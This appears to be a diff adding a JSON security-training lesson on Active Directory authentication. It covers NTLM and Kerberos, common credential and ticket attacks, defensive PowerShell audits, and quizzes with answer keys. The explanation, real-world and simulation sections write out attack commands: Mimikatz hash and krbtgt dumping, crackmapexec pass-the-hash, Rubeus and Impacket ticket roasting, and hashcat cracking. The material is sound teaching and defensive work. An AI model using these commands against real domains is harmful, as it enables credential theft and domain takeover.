@@ -1,0 +1,186 @@
+{
+  "lesson_id": "2d455363-f88b-4e62-b054-63149e37ef23",
+  "domain": "active_directory",
+  "title": "Active Directory Authentication 101",
+  "difficulty": 1,
+  "order_index": 27,
+  "prerequisites": [
+    "active_directory_26"
+  ],
+  "estimated_time": 45,
+  "concepts": [
+    "NTLM",
+    "Kerberos",
+    "authentication",
+    "tickets",
+    "TGT",
+    "TGS",
+    "KDC",
+    "pass-the-hash",
+    "ticket attacks",
+    "LDAP authentication"
+  ],
+  "learning_objectives": [
+    "Explain how NTLM authentication works and why it is considered legacy and weak",
+    "Describe the Kerberos authentication flow including TGT and service tickets",
+    "Identify common authentication-based attacks: Pass-the-Hash, Pass-the-Ticket, Kerberoasting",
+    "Understand why attackers target authentication systems in Active Directory environments",
+    "Apply basic hardening recommendations to improve authentication security"
+  ],
+  "jim_kwik_principles": [
+    "active_learning",
+    "minimum_effective_dose",
+    "teach_like_im_10",
+    "memory_hooks",
+    "meta_learning",
+    "connect_to_what_i_know",
+    "reframe_limiting_beliefs",
+    "gamify_it",
+    "learning_sprint",
+    "multiple_memory_pathways"
+  ],
+  "content_blocks": [
+    {
+      "block_id": "89ac209c-c662-454b-8bad-b1d4acd1ff32",
+      "type": "mindset_coach",
+      "content": {
+        "text": "Authentication is the crown jewel of Active Directory — and the favorite target of attackers. Here's a sobering fact: In most ransomware investigations, attackers don't crack passwords. They STEAL authentication tokens. They capture hashes. They forge Kerberos tickets. They never need your password in plaintext because Windows gives them the keys through its own authentication protocols.\n\nThis lesson might feel technical, but stick with it. Understanding NTLM and Kerberos is what separates someone who can follow a security checklist from someone who genuinely understands WHY those controls matter. Once you understand how authentication works, you'll immediately see why attacks like Pass-the-Hash and Golden Tickets are so devastating — and what it really takes to stop them. Think of this lesson as understanding how the locks on a door work — not to pick locks, but to know which locks are actually secure."
+      }
+    },
+    {
+      "block_id": "22189675-96f5-4c26-8b9c-7bcb406bc965",
+      "type": "explanation",
+      "content": {
+        "text": "## NTLM Authentication: The Legacy Protocol\n\nNTLM (NT LAN Manager) is Microsoft's older authentication protocol. Despite being considered legacy and problematic, it's still everywhere in corporate networks — it's used when Kerberos fails, for local accounts, for workgroup computers, and in many legacy applications.\n\n### How NTLM Works (Challenge-Response)\n\nNTLM uses a challenge-response mechanism. Critically, **your password is never sent over the network** — instead, a hash of your password is used to respond to a mathematical challenge:\n\n```\n[CLIENT]                              [SERVER/DC]\n   |                                      |\n   |  1. NEGOTIATE (I want to auth)       |\n   |------------------------------------->|\n   |                                      |\n   |  2. CHALLENGE (here's a random #)   |\n   |<-------------------------------------|\n   |                                      |\n   |  3. AUTHENTICATE                     |\n   |  (Hash(password) + challenge = resp) |\n   |------------------------------------->|\n   |                                      |\n   |  4. DC verifies response             |\n   |     (has your NT hash, does same math)|\n   |  5. SUCCESS or FAILURE               |\n   |<-------------------------------------|\n```\n\n### NTLM Hash: What It Is\n\nThe NT hash is MD4(UTF-16LE(password)). For example:\n- Password: `P@ssword123`\n- NT Hash: `d0d7fa6dc02e76e2baba89f4a8936e27`\n\n**Critical security insight:** The NT hash IS the credential. An attacker who has your NT hash can authenticate AS YOU without knowing your actual password. This is called **Pass-the-Hash (PtH)**.\n\n### Why NTLM Is Problematic\n\n1. **Pass-the-Hash attacks**: Stolen hashes work for authentication\n2. **NTLM Relay attacks**: Attacker intercepts and relays NTLM authentication to a different target\n3. **No mutual authentication**: Client authenticates to server, but server doesn't prove its identity to client\n4. **Weak hashing**: MD4 is cryptographically weak by modern standards\n5. **No timestamps**: Captured challenges can be replayed\n6. **Brute force friendly**: NT hashes crack quickly with modern GPUs\n\n### Common NTLM Attack: Pass-the-Hash\n\nAn attacker dumps NT hashes from a compromised machine (using Mimikatz or similar). They then use those hashes directly to authenticate to other machines:\n\n```cmd\n# Mimikatz: dump hashes from memory\nSEKURLSA::logonpasswords\n\n# Use hash to authenticate (using crackmapexec)\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:d0d7fa6dc02e76e2baba89f4a8936e27' --local-auth\n```\n\nThe victim server never knows the difference — it just sees a valid NT hash response to its challenge."
+      }
+    },
+    {
+      "block_id": "12ab0b46-4d16-4d44-9d2c-717e2fda50b8",
+      "type": "explanation",
+      "content": {
+        "text": "## Kerberos Authentication: The Modern Protocol\n\nKerberos is the preferred authentication protocol in Active Directory environments. Named after the three-headed dog guarding Hades in Greek mythology, Kerberos uses a trusted third party (the Key Distribution Center) to authenticate users without sending credentials over the network.\n\n### The Key Players\n\n- **Client (C)**: The user or computer requesting access\n- **KDC (Key Distribution Center)**: Runs on the Domain Controller — has two components:\n  - **AS (Authentication Service)**: Issues Ticket Granting Tickets\n  - **TGS (Ticket Granting Service)**: Issues service tickets\n- **Service (S)**: The resource the user wants to access (file share, web app, etc.)\n\n### The Kerberos Flow (Step by Step)\n\n**Phase 1: Get a Ticket Granting Ticket (TGT)**\n```\nUser logs in → Client sends AS-REQ to KDC\n  (contains username + timestamp encrypted with user's password hash)\n  \nKDC verifies → Sends AS-REP back to client:\n  - TGT: encrypted with KRBTGT account's hash (client can't read this)\n  - Session key: encrypted with user's password hash\n  \nClient now holds a TGT (like an 'I've been authenticated' token)\nTGT is valid for 10 hours by default\n```\n\n**Phase 2: Request a Service Ticket**\n```\nClient wants access to \\\\fileserver\\share\nClient sends TGS-REQ to KDC:\n  - TGT (proving identity)\n  - Service Principal Name (SPN): identifies the service\n  \nKDC verifies TGT → Sends TGS-REP:\n  - Service Ticket: encrypted with SERVICE's password hash\n  - New session key for client-service communication\n```\n\n**Phase 3: Access the Service**\n```\nClient sends AP-REQ to the file server:\n  - Service Ticket\n  - Authenticator (timestamp encrypted with session key)\n  \nFile server decrypts ticket with its own hash\n  - Verifies timestamp to prevent replay attacks\n  - Sees: username, group memberships, permissions\n  - Grants or denies access\n```\n\n### Key Kerberos Security Properties\n\n- **Mutual authentication**: Both client and server prove identity\n- **Timestamps prevent replay**: Each ticket has a short validity window\n- **Principle of least exposure**: Password only used once at login\n- **Tickets are time-limited**: TGTs expire (default 10h), service tickets expire (default 5-10min)\n\n### Important Kerberos Concepts\n\n**SPN (Service Principal Name)**: A unique identifier for a service. Format: `serviceType/hostname:port`. Example: `HTTP/webserver.company.local` or `MSSQLSvc/sqlserver.company.local:1433`. SPNs are registered in AD under the service account that runs the service.\n\n**KRBTGT Account**: The KDC's service account — its password hash is used to encrypt ALL TGTs. If an attacker gets this hash, they can forge TGTs for ANY user. This is called a **Golden Ticket attack**.\n\n**PAC (Privilege Attribute Certificate)**: Embedded in Kerberos tickets, contains the user's group memberships and privileges. Services use PAC data to make authorization decisions without querying AD."
+      }
+    },
+    {
+      "block_id": "d06cff8e-0182-4bc8-a638-8241b1f28465",
+      "type": "diagram",
+      "content": {
+        "text": "## Kerberos Authentication Flow — Visual\n\n```\n                        [KDC on Domain Controller]\n                        +------------------------+\n                        |  Authentication Svc   |\n                        |  (AS) - issues TGTs   |\n                        |                        |\n                        |  Ticket Granting Svc   |\n                        |  (TGS) - issues STs    |\n                        +------------------------+\n                              ^\n             1. AS-REQ        |        2. AS-REP\n         (username+timestamp) |        (TGT + session key)\n                              |\n[CLIENT: Alice]<==============+\n     |\n     |  Now holds TGT\n     |\n     |  3. TGS-REQ\n     |  (TGT + SPN of target service)\n     |=========================================> [KDC]\n     |  4. TGS-REP                              <=========\n     |  (Service Ticket encrypted with service's key)\n     |\n     |  5. AP-REQ\n     |  (Service Ticket + Authenticator)\n     |=========================================> [FILE SERVER]\n     |  6. AP-REP (optional mutual auth)       <=========\n     |\n     |  7. ACCESS GRANTED!\n\n```\n\n## NTLM vs Kerberos Comparison\n\n```\n+------------------------+------------------+--------------------+\n| Feature                | NTLM             | Kerberos           |\n+------------------------+------------------+--------------------+\n| Mutual Authentication  | No               | Yes                |\n| Password on network?   | No (hash used)   | No (encrypted)     |\n| Requires DC online?    | Yes              | Yes                |\n| Works across forests?  | Yes              | Requires trust     |\n| Ticket forgery risk?   | Lower            | Golden/Silver tkt  |\n| Pass-the-Hash risk?    | HIGH             | Lower              |\n| Protocol age           | Windows NT era   | RFC 1510 (1993)    |\n| Current support        | Legacy/deprecated| Default in AD      |\n+------------------------+------------------+--------------------+\n```\n\n## Authentication Attack Taxonomy\n\n```\n[Credential Attacks]\n    ├── Brute Force (guess passwords)\n    ├── Password Spray (few passwords, many accounts)\n    └── Credential Stuffing (leaked password databases)\n\n[Hash Attacks]\n    ├── Pass-the-Hash (NTLM only)\n    └── Overpass-the-Hash (hash → Kerberos TGT)\n\n[Ticket Attacks]\n    ├── Pass-the-Ticket (stolen Kerberos tickets)\n    ├── Kerberoasting (offline cracking of service tickets)\n    ├── ASREPRoasting (accounts without pre-auth)\n    ├── Golden Ticket (forged TGT using KRBTGT hash)\n    └── Silver Ticket (forged service ticket)\n```"
+      }
+    },
+    {
+      "block_id": "72aa0d88-423e-490e-a95c-09ebac7d30da",
+      "type": "real_world",
+      "content": {
+        "text": "## Real-World Attack: Kerberoasting in a Financial Institution\n\n**Background:** A mid-sized financial services firm was compromised via a spear-phishing email. The attacker gained access to a standard user account — no special privileges. Using only this account, they achieved domain compromise within 3 days.\n\n**The Kerberoasting Attack:**\n\nKerberoasting exploits the fact that ANY authenticated user can request service tickets for ANY SPN in the domain. Service tickets are encrypted with the service account's NT hash. If the service account has a weak password, the ticket can be cracked offline.\n\n1. Attacker enumerated all SPNs in the domain:\n```powershell\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName | Select Name, ServicePrincipalName\n```\n\n2. Found 12 service accounts with SPNs. Requested tickets for all of them using Rubeus:\n```cmd\nRubeus.exe kerberoast /outfile:hashes.txt\n```\n\n3. Took the ticket hashes offline for cracking with hashcat:\n```cmd\nhashcat -a 0 -m 13100 hashes.txt wordlist.txt --rules=best64.rule\n```\n\n4. Within 4 hours, cracked a service account password: `SQLService_prod` had password `Passw0rd2022!`\n\n5. That service account had admin rights on 3 SQL servers AND was a member of `Domain Admins` (an overprivileged legacy account). Game over.\n\n**The Defense:**\n- Use strong, long random passwords for service accounts (25+ characters — cracking becomes impractical)\n- Prefer Group Managed Service Accounts (gMSA) — passwords auto-rotated by AD\n- Alert when large numbers of Kerberos service ticket requests come from a single user account\n- Principle of least privilege: service accounts should NEVER be in Domain Admins\n\n---\n\n## Real-World Attack: Golden Ticket (Persistence)\n\n**What happened:** After an attacker achieved Domain Admin access (via Kerberoasting above), they wanted persistent access even after the breach was discovered and all passwords changed.\n\nUsing Mimikatz, they dumped the KRBTGT account hash:\n```cmd\nMimikatz: lsadump::dcsync /user:krbtgt\n```\n\nThis hash, combined with the domain SID, lets the attacker forge a TGT for ANY user that is valid for 10 years. Even after the breach was discovered and the real domain admin passwords were reset, the attacker could still authenticate as a Domain Admin.\n\n**The detection challenge:** Golden tickets look like legitimate Kerberos tickets. They won't appear in normal logs. Detection requires specific monitoring:\n- Tickets with unusually long validity (>10 hours)\n- Tickets for users with mismatched domain SID in Event ID 4769\n- Account username appears in TGT but doesn't exist in AD\n\n**The remediation:** You must change the KRBTGT account password TWICE (two resets, 10 hours apart) to invalidate all forged tickets. This is a painful, complex operation that many organizations delay — giving attackers a longer window."
+      }
+    },
+    {
+      "block_id": "39dfef22-dd67-4b87-bf97-946358821a23",
+      "type": "simulation",
+      "content": {
+        "text": "## Attack Simulation: ASREPRoasting\n\nASREP Roasting targets accounts that have 'Do not require Kerberos preauthentication' enabled. Normally, Kerberos requires the client to prove they know the password before the KDC sends back a TGT. If this pre-authentication is disabled, ANYONE can request an AS-REP for that account — and the response contains material encrypted with the account's password hash.\n\n**Step-by-step simulation:**\n\n```\nScenario: Attacker has NO credentials at all (or minimal access)\n\nStep 1: Enumerate accounts without pre-auth (can be done without credentials in some cases)\n\n[Impacket - no credentials needed]\n$ GetNPUsers.py company.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt\n\nOutput:\n$krb5asrep$23$svc_legacy@COMPANY.LOCAL:1234567890abcdef...[hash continues]\n$krb5asrep$23$john.temp@COMPANY.LOCAL:abcdef1234567890...[hash continues]\n\nStep 2: Crack the hashes offline\n$ hashcat -a 0 -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\n\nResult after 23 minutes:\nsvc_legacy:Summer2023!     ← cracked!\n\nStep 3: Use cracked credentials\nNow attacker has valid credentials for svc_legacy\nQuery: What groups is svc_legacy in?\n  - Get-ADPrincipalGroupMembership -Identity svc_legacy\n  - Member of: G_Backup_Agents (with server access!)\n\n```\n\n**Why this account had pre-auth disabled:**\n- Legacy application from 2015 couldn't support Kerberos pre-auth\n- IT added the flag 'just to make it work'\n- Never reviewed or removed\n- Password was last reset in 2023 (before that: never)\n\n**Defense checklist for ASREPRoasting:**\n```powershell\n# Find accounts with pre-authentication disabled\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth\n\n# Fix: enable pre-auth on each account\nSet-ADAccountControl -Identity svc_legacy -DoesNotRequirePreAuth $false\n\n# If the app breaks - that's a conversation with the vendor\n# Modern apps must support Kerberos pre-authentication\n```"
+      }
+    },
+    {
+      "block_id": "5f9d72bb-ac5f-419a-8f21-0dc870c4dd7c",
+      "type": "code_exercise",
+      "content": {
+        "text": "## Hands-On: Auditing Authentication Security with PowerShell\n\nThese commands help you identify authentication security risks in an AD environment:\n\n```powershell\n# ===== KERBEROASTING RISK ASSESSMENT =====\n\n# Find all accounts with SPNs (Kerberoastable accounts)\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName, PasswordLastSet, PasswordNeverExpires, LastLogonDate |\n    Select Name, SamAccountName, ServicePrincipalName, PasswordLastSet, PasswordNeverExpires |\n    Format-List\n\n# Assess risk: SPNs with old passwords are highest risk\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName, PasswordLastSet |\n    Where {$_.PasswordLastSet -lt (Get-Date).AddDays(-180)} |  # Password older than 6 months\n    Select Name, SamAccountName, PasswordLastSet\n\n# BETTER: Find which SPNs are set on high-privilege accounts\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\" -and adminCount -eq 1} -Properties ServicePrincipalName, adminCount |\n    Select Name, SamAccountName, ServicePrincipalName  # These are CRITICAL - privileged accounts with SPNs!\n\n\n# ===== ASREP ROASTING RISK ASSESSMENT =====\n\n# Find accounts with pre-authentication disabled\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth, Enabled |\n    Where {$_.Enabled -eq $true} |\n    Select Name, SamAccountName  # Any result here is a risk!\n\n\n# ===== NTLM USAGE ASSESSMENT =====\n\n# Check Windows version of DCs (older DCs may use NTLMv1)\nGet-ADDomainController -Filter * | Select Name, OperatingSystem, OperatingSystemVersion\n\n# Find computers still running Windows XP/7 (force NTLM/NTLMv1 usage)\nGet-ADComputer -Filter {OperatingSystem -like \"*Windows XP*\" -or OperatingSystem -like \"*Windows 7*\"} `\n    -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate\n\n\n# ===== CREDENTIAL EXPOSURE ASSESSMENT =====\n\n# Find accounts where password hasn't been changed in a very long time\nGet-ADUser -Filter {Enabled -eq $true} -Properties PasswordLastSet |\n    Where {$_.PasswordLastSet -lt (Get-Date).AddYears(-2)} |\n    Select Name, SamAccountName, PasswordLastSet | Sort PasswordLastSet\n\n# Find accounts with 'password not required'\nGet-ADUser -Filter {PasswordNotRequired -eq $true} -Properties PasswordNotRequired |\n    Select Name, SamAccountName  # Should return nothing in a secure environment!\n\n\n# ===== GOLDEN TICKET DEFENSE =====\n\n# Check KRBTGT password age (should be changed at least every 180 days)\n$krbtgt = Get-ADUser krbtgt -Properties PasswordLastSet\nWrite-Host \"KRBTGT password last changed: $($krbtgt.PasswordLastSet)\"\n$daysSinceChange = ((Get-Date) - $krbtgt.PasswordLastSet).Days\nWrite-Host \"Days since last change: $daysSinceChange\"\nif ($daysSinceChange -gt 180) {\n    Write-Warning \"KRBTGT password should be rotated! Consider scheduling rotation.\"\n}\n\n\n# ===== COMPREHENSIVE SECURITY REPORT =====\n\n$report = @()\n\n# Count Kerberoastable accounts\n$kerberoastable = (Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} | Measure-Object).Count\n$report += \"Kerberoastable accounts: $kerberoastable\"\n\n# Count ASREPRoastable accounts  \n$asrep = (Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} | Measure-Object).Count\n$report += \"ASREPRoastable accounts: $asrep\"\n\n# Count stale accounts\n$stale = (Get-ADUser -Filter {Enabled -eq $true -and LastLogonDate -lt (Get-Date).AddDays(-90)} -Properties LastLogonDate | Measure-Object).Count\n$report += \"Stale enabled accounts (90+ days): $stale\"\n\n$report | ForEach-Object { Write-Host $_ }\n```\n\n**Exercise Goal:** Run this audit against your lab environment and create a remediation priority list. Accounts with SPNs AND adminCount=1 are your highest-priority fixes."
+      }
+    },
+    {
+      "block_id": "523dac83-15d2-47bb-9f98-7ec2f69310a2",
+      "type": "memory_aid",
+      "content": {
+        "text": "## Memory Hook: The Concert Ticket Analogy for Kerberos\n\n**Kerberos = A concert ticketing system**\n\n**You (Client)** want to see a band (access a service).\n\n**Step 1:** You go to the **Ticket Office (Authentication Service)**.\n- You show your ID (username + encrypted timestamp)\n- They give you a **Season Pass (TGT)** — proves you're a legitimate customer\n- They also give you a **session token** so you can communicate privately\n\n**Step 2:** At the venue, you go to the **Box Office (Ticket Granting Service)**.\n- You show your Season Pass (TGT)\n- You say 'I want to see the rock concert' (service request)\n- They give you a **Concert Ticket (Service Ticket)** — encrypted, can only be verified by the venue\n\n**Step 3:** You arrive at the **Rock Stage (Service)**.\n- You hand over your Concert Ticket\n- The stage crew (service) verifies it matches their list\n- You're in! (access granted)\n\n**The attacks mapped to the analogy:**\n- **Golden Ticket**: You stole the printing press from the Ticket Office — now you can print ANY season pass for ANY name\n- **Silver Ticket**: You stole the venue's stamp — now you can print fake concert tickets for THAT venue\n- **Kerberoasting**: You got a real concert ticket — now you're trying to reverse-engineer the printing process from the ticket's unique markings\n- **Pass-the-Ticket**: You stole someone else's concert ticket and walked in as them\n\n**NTLM in one sentence:** 'The bouncer hashes your password and checks it against their list — but if someone steals the hash, they can pretend to be you.'"
+      }
+    },
+    {
+      "block_id": "e259c96e-6778-4b17-b16d-c6bb8801115f",
+      "type": "quiz",
+      "content": {
+        "text": "## Knowledge Check\n\n**Q1:** What makes Kerberoasting possible?\nA) Domain Controllers don't require authentication to query SPNs\nB) Any domain user can request service tickets for any SPN, and those tickets are encrypted with the service account's password hash\nC) Service accounts don't require passwords in Active Directory\nD) Kerberos tickets are transmitted in plaintext\n\n**Answer: B** — Any authenticated domain user can request a service ticket (TGS-REP) for any service with a registered SPN. The ticket is encrypted using the service account's NT hash. If the service account has a weak password, an attacker can crack the encrypted ticket offline.\n\n---\n\n**Q2:** What is the KRBTGT account, and why is it critical?\nA) A service account for web applications — compromise gives web server access\nB) The domain's built-in admin account — compromise gives one server's admin access  \nC) The KDC service account whose hash is used to encrypt ALL Kerberos tickets — compromise allows forging tickets for any user\nD) A backup domain controller account — compromise allows reading the AD database\n\n**Answer: C** — The KRBTGT account's NT hash is used to encrypt ALL Ticket Granting Tickets (TGTs). An attacker with this hash can forge a TGT for ANY user, including Domain Admins, valid for any time period. This is called a Golden Ticket attack and gives permanent domain persistence.\n\n---\n\n**Q3:** An organization wants to prevent Pass-the-Hash attacks. Which of the following would be MOST effective?\nA) Require all users to change passwords every 30 days\nB) Implement Protected Users security group, disable NTLMv1, and use Windows Defender Credential Guard\nC) Enable audit logging for all authentication events\nD) Require two-factor authentication for web applications only\n\n**Answer: B** — Protected Users group prevents credential caching and NTLM authentication for members. Disabling NTLMv1 removes the weakest version. Credential Guard uses virtualization-based security to prevent credential extraction from LSASS. These together significantly reduce PtH attack surface."
+      }
+    },
+    {
+      "block_id": "e262e6cb-237d-48e3-9097-6e1ae44fe85e",
+      "type": "reflection",
+      "content": {
+        "text": "## Reflection: Authentication Security in Your Organization\n\nTake a few minutes to think through these questions:\n\n1. **Where is NTLM still being used in your organization?** Think about: older applications, network printers that authenticate users, file shares accessed by IP address rather than hostname (which forces NTLM), cloud synced environments. NTLM is surprisingly hard to fully eliminate — but you should know where it lives.\n\n2. **How many Kerberoastable accounts does your organization have?** If you ran the PowerShell command from this lesson, you might be surprised. The question to ask is: 'Do these service accounts have strong, randomly generated passwords, or are they human-chosen passwords that could be cracked?'\n\n3. **When was your KRBTGT password last rotated?** At many organizations, the answer is 'never' or 'we don't know.' This means the Golden Ticket blast radius from any previous breach is still open. What would it take to implement quarterly KRBTGT password rotation in your organization?\n\n4. **Think about the Kerberoasting attack path:** attacker → any user account → request service tickets → crack offline → escalate to service account → escalate to Domain Admin. How many steps in this chain can your organization currently detect?\n\n5. **Protected Users security group:** Adding Domain Admins to this group prevents NTLM authentication and credential caching for those accounts. What would be the impact of doing this tomorrow? Which applications might break?\n\n**Key Insight:** Authentication attacks are so prevalent in AD environments because the protocols have inherent weaknesses AND many organizations don't monitor for abuse. The attackers are patient — they can enumerate, Kerberoast, and crack offline without generating a single alert if monitoring isn't configured correctly."
+      }
+    }
+  ],
+  "post_assessment": [
+    {
+      "question_id": "8ef036a0-953e-4cd6-b8e1-e3e8cf56badf",
+      "type": "multiple_choice",
+      "question": "Which statement BEST describes how NTLM authentication works?",
+      "options": [
+        "A) The client sends their plaintext password to the server which checks it against the AD database",
+        "B) The client receives a random challenge from the server and responds with a hash derived from their password and the challenge",
+        "C) The client requests a ticket from the KDC using their password, then presents the ticket to the server",
+        "D) The server sends the client's hashed password encrypted with its own key"
+      ],
+      "correct_answer": "B",
+      "explanation": "NTLM is a challenge-response protocol. The server (or DC) sends a random challenge to the client. The client uses their NT hash (MD4 of their password) to compute a response to this challenge. The server verifies the response. The actual password is never transmitted — but the NT hash is effectively used as the credential, enabling Pass-the-Hash attacks.",
+      "difficulty": 1
+    },
+    {
+      "question_id": "a904bf7c-5de4-46f6-aa59-205f292b96e3",
+      "type": "multiple_choice",
+      "question": "What is a Ticket Granting Ticket (TGT) in Kerberos?",
+      "options": [
+        "A) A ticket that grants direct access to a specific service like a file share",
+        "B) A certificate signed by a Certificate Authority proving the user's identity",
+        "C) A time-limited credential issued by the Authentication Service that proves the user is authenticated and allows requesting service tickets",
+        "D) A temporary password used when the user forgets their real password"
+      ],
+      "correct_answer": "C",
+      "explanation": "A TGT is issued by the Authentication Service (AS) component of the KDC after successful initial authentication. It's encrypted with the KRBTGT account's hash (so only the KDC can read it). The client presents the TGT to the Ticket Granting Service (TGS) to request service-specific tickets, without having to re-authenticate with their password each time.",
+      "difficulty": 1
+    },
+    {
+      "question_id": "829b78ef-09a4-401f-80c6-1f0c4c2944e4",
+      "type": "multiple_choice",
+      "question": "An attacker successfully performs a Kerberoasting attack. What did they obtain?",
+      "options": [
+        "A) Plaintext passwords for all domain users",
+        "B) The KRBTGT hash allowing them to forge golden tickets",
+        "C) Service tickets encrypted with service account password hashes, which can be cracked offline",
+        "D) A valid TGT allowing them to impersonate any domain user"
+      ],
+      "correct_answer": "C",
+      "explanation": "Kerberoasting involves requesting service tickets for accounts with SPNs. Service tickets are encrypted with the service account's NT hash. The attacker extracts these tickets and attempts to crack them offline using password cracking tools. If successful, they obtain the service account's plaintext password. The attack doesn't require any special privileges — any authenticated domain user can request service tickets.",
+      "difficulty": 1
+    },
+    {
+      "question_id": "9cd3eb57-af5f-470e-9c5e-ecb148d07082",
+      "type": "multiple_choice",
+      "question": "What is an ASREPRoastable account?",
+      "options": [
+        "A) An account with a Service Principal Name registered, making it targetable for Kerberoasting",
+        "B) An account with 'Do not require Kerberos preauthentication' enabled, allowing anyone to get an AS-REP encrypted with the account's hash",
+        "C) An account that is a member of Protected Users group and cannot use NTLM",
+        "D) An account with admin privileges that can be targeted for Pass-the-Hash"
+      ],
+      "correct_answer": "B",
+      "explanation": "AS-REP Roasting targets accounts where Kerberos pre-authentication is disabled (DoesNotRequirePreAuth = true). Normally, a client must prove knowledge of their password before the KDC sends an AS-REP. Without this requirement, anyone can request an AS-REP for that account, which contains data encrypted with the account's hash. This can be cracked offline to reveal the password.",
+      "difficulty": 1
+    },
+    {
+      "question_id": "ea71cf89-b716-4d4b-b668-d19107afdf63",
+      "type": "multiple_choice",
+      "question": "An attacker has obtained the KRBTGT account's NT hash. What is the most significant attack they can now perform?",
+      "options": [
+        "A) Reset the KRBTGT password, locking out all Kerberos authentication",
+        "B) Decrypt all current Kerberos service tickets",
+        "C) Forge TGTs for any user (including Domain Admins) valid for any time period — Golden Ticket attack",
+        "D) Read all encrypted Active Directory database contents"
+      ],
+      "correct_answer": "C",
+      "explanation": "The KRBTGT hash is used to encrypt all TGTs. An attacker with this hash can use tools like Mimikatz to forge TGTs for any user, with any group memberships, valid for any duration (often 10 years). This Golden Ticket provides persistent domain admin access that survives password resets of other accounts. Remediation requires changing the KRBTGT password TWICE, 10 hours apart.",
+      "difficulty": 1
+    }
+  ]
+}
